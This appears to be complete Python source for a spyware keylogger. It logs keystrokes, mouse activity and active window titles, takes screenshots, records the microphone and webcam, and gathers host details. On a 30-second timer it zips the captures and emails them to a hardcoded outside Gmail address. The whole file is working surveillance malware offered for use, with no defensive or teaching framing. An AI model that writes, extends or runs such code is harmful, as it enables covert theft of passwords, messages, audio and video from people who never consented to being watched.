import os
import platform
import smtplib
import socket
import threading
import wave
import zipfile
import cv2
import pyscreenshot
import sounddevice as sd
from pynput import keyboard, mouse
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime
import pygetwindow as gw

# Update your email credentials here
EMAIL_ADDRESS = ""
EMAIL_PASSWORD = ""
SEND_REPORT_EVERY = 30  # seconds

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log_filename = "logs.txt"
        self.email = email
        self.password = password
        self.last_window = ""

        # Initialize the log file
        with open(self.log_filename, "w") as f:
            f.write("KeyLogger Started...\n")

    def appendlog(self, string):
        with open(self.log_filename, "a") as f:
            f.write(string)

    def on_move(self, x, y):
        current_move = f"Mouse moved to {x}, {y}\n"
        self.appendlog(current_move)

    def on_click(self, x, y, button, pressed):
        current_click = f"Mouse {'pressed' if pressed else 'released'} at {x}, {y} with {button}\n"
        self.appendlog(current_click)

    def on_scroll(self, x, y, dx, dy):
        current_scroll = f"Mouse scrolled at {x}, {y} with delta {dx}, {dy}\n"
        self.appendlog(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = f" {str(key)} "
        self.appendlog(current_key)

    def send_mail(self, email, password, subject, body, attachments=None):
        sender = email
        receiver = "studiesvit@gmail.com"

        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = subject

        msg.attach(MIMEText(body, 'plain'))

        if attachments:
            for file in attachments:
                with open(file, 'rb') as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file)}')
                    msg.attach(part)

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(sender, receiver, msg.as_string())
            server.quit()
        except Exception as e:
            print(f"Failed to send email: {e}")

    def zip_files(self):
        zip_filename = f"keylogger_data_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.zip"
        with zipfile.ZipFile(zip_filename, 'w') as zf:
            zf.write(self.log_filename)
            if os.path.exists("screenshot.png"):
                zf.write("screenshot.png")
            if os.path.exists("sound.wav"):
                zf.write("sound.wav")
            if os.path.exists("camera.avi"):
                zf.write("camera.avi")
        return zip_filename

    def report(self):
        zip_filename = self.zip_files()
        self.send_mail(self.email, self.password, "Keylogger Report", "Find attached zip file.", [zip_filename])
        # Delete the zip file after sending the email to save space
        os.remove(zip_filename)
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog(f"Hostname: {hostname}\nIP: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\n")

    def microphone(self):
        fs = 44100
        seconds = 10  # Duration of recording
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        wave_filename = 'sound.wav'
        wave_file = wave.open(wave_filename, 'wb')
        wave_file.setnchannels(2)
        wave_file.setsampwidth(2)
        wave_file.setframerate(fs)
        wave_file.writeframes(myrecording.tobytes())
        wave_file.close()

    def screenshot(self):
        img = pyscreenshot.grab()
        img.save("screenshot.png")

    def camera_recording(self, duration=10):
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print("Cannot open camera")
            return
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter('camera.avi', fourcc, 20.0, (640, 480))

        start_time = datetime.now()
        while (datetime.now() - start_time).seconds < duration:
            ret, frame = cap.read()
            if not ret:
                print("Can't receive frame (stream end?). Exiting ...")
                break
            out.write(frame)

        cap.release()
        out.release()

    def track_active_window(self):
        current_window = gw.getActiveWindow()
        if current_window:
            window_title = current_window.title
            if window_title != self.last_window:
                self.last_window = window_title
                self.appendlog(f"Window changed to: {window_title}\n")
                self.screenshot()
        threading.Timer(1, self.track_active_window).start()

    def periodic_recording(self):
        # Record microphone and camera every interval
        self.microphone()
        self.camera_recording()
        threading.Timer(self.interval, self.periodic_recording).start()

    def run(self):
        self.system_information()
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        mouse_listener = mouse.Listener(on_move=self.on_move, on_click=self.on_click, on_scroll=self.on_scroll)
        
        # Start listeners
        keyboard_listener.start()
        mouse_listener.start()

        # Start the periodic recordings
        self.periodic_recording()

        # Start the reporting thread
        self.report()

        # Start tracking the active window
        self.track_active_window()

        # Join the listeners to the main thread to keep the program running
        keyboard_listener.join()
        mouse_listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
